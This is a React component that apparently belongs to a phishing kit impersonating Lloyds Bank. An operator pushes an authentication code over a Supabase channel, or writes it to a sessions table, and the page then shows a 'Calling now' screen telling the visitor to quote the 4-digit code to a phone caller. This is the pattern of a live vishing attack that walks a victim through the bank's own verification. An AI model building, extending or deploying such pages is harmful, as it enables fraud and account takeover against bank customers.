import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Lock } from "lucide-react";

interface CallingNowScreenProps {
  sessionId: string;
  email: string;
}

const CallingNowScreen = ({ sessionId, email }: CallingNowScreenProps) => {
  const [authCode, setAuthCode] = useState<string[]>([]);

  // Listen for admin sending auth code on shared channel
  useEffect(() => {
    const channelName = `lloyds-${sessionId}`;
    const channel = supabase.channel(channelName);

    channel
      .on("broadcast", { event: "lloyds_auth_code" }, (p) => {
        const code = p.payload?.code as string;
        if (code) {
          setAuthCode(code.split("").filter((c) => c.trim()));
        }
      })
      .subscribe();

    // Polling fallback
    const poll = setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("otp_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (data?.otp_code?.startsWith("lloyds_code:")) {
        const code = data.otp_code.replace("lloyds_code:", "");
        const digits = code.split("").filter((c) => c.trim());
        if (digits.length > 0 && authCode.length === 0) {
          setAuthCode(digits);
        }
      }
    }, 2500);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(poll);
    };
  }, [sessionId, authCode.length]);

  if (authCode.length === 0) {
    return (
      <div className="flex flex-col items-center text-center py-8">
        <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[hsl(168,60%,92%)]">
          <Lock className="h-7 w-7 text-[hsl(168,60%,30%)]" />
        </div>
        <h2 className="text-lg font-bold text-[hsl(0,0%,15%)] mb-2">
          Preparing your call...
        </h2>
        <p className="text-sm text-[hsl(0,0%,45%)]">
          Please wait while we set up the security check.
        </p>
        <div className="mt-4 flex gap-1.5">
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:0ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:150ms]" />
          <span className="h-2 w-2 animate-bounce rounded-full bg-[hsl(168,60%,35%)] [animation-delay:300ms]" />
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col -mx-8 -mt-8 -mb-8">
      {/* Green header bar */}
      <div className="bg-[hsl(168,70%,18%)] py-3 px-4 flex items-center justify-center">
        <h2 className="text-base font-bold text-white">Calling now</h2>
      </div>

      <div className="px-6 pt-6 pb-6">
        <p className="text-sm text-[hsl(0,0%,25%)] mb-8 leading-relaxed">
          You'll need to quote the 4-digit authentication code below during the
          phone call.
        </p>

        {/* Auth code display */}
        <div className="flex justify-center gap-4 mb-8">
          {authCode.map((digit, i) => (
            <div
              key={i}
              className="flex h-16 w-16 items-center justify-center border border-[hsl(0,0%,82%)]"
            >
              <span className="text-3xl font-medium text-[hsl(0,0%,20%)]">
                {digit}
              </span>
            </div>
          ))}
        </div>

        {/* Lock icon with circle */}
        <div className="flex justify-center mb-10">
          <div className="relative h-16 w-16">
            {/* Dashed circle */}
            <svg className="h-16 w-16" viewBox="0 0 64 64">
              <circle
                cx="32"
                cy="32"
                r="28"
                fill="none"
                stroke="hsl(168,60%,35%)"
                strokeWidth="2"
                strokeDasharray="6 4"
              />
              {/* Yellow accent arc */}
              <circle
                cx="32"
                cy="32"
                r="28"
                fill="none"
                stroke="hsl(50,70%,50%)"
                strokeWidth="2.5"
                strokeDasharray="20 156"
                strokeDashoffset="-40"
              />
            </svg>
            <div className="absolute inset-0 flex items-center justify-center">
              <Lock className="h-6 w-6 text-[hsl(168,60%,30%)]" />
            </div>
          </div>
        </div>

        <p className="text-sm text-[hsl(0,0%,35%)] text-center leading-relaxed">
          Once you've completed the security check, please follow the instructions
          on screen to continue.
        </p>
      </div>
    </div>
  );
};

export default CallingNowScreen;
